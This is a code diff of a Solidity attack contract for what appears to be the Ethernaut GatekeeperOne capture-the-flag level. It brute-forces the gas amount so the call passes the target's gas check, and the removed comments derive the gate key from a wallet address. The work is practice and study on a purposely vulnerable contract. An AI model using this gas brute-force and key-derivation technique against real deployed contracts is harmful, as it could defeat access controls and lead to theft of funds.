@@ -32,30 +32,22 @@ contract GatekeeperOne {
 
 contract Atk_Gate1 {
     GatekeeperOne public target;
-    uint public gas_left;
+    uint public gas_calc;
 
-    function set_target(address addr) public {
-        target = GatekeeperOne(addr);
+    constructor(address _addr) {
+        target = GatekeeperOne(_addr);
     }
 
     function enter(bytes8 _key) public {
-        for (uint256 i = 0; i <= 8191; i++) {
-            try target.enter{gas : 819100 + i}(_key) {
-                gas_left = 819100 + i;
-                break;
-            } catch {}
+        if (gas_calc == 0) {
+            for (uint256 i = 0; i <= 8191; i++) {
+                try target.enter{gas : 819100 + i}(_key) {
+                    gas_calc = 819100 + i;
+                    break;
+                } catch {}
+            }
+        } else {
+            target.enter{gas : gas_calc}(_key);
         }
     }
-
-    fallback() payable external {
-
-    }
 }
-
-//wallet: 0x833514593c7798551A20Ac69f98D486e2A12dFe8
-//        uint16(uint160(tx.origin)) : 0xdFe8
-//        uint32(uint64(_gateKey)): 0x0000dFe8
-//        uint64(_gateKey) : 0x--------0000dFe8
-
-// atk.enter('0x10000dFe8',{"from":wallet})
-
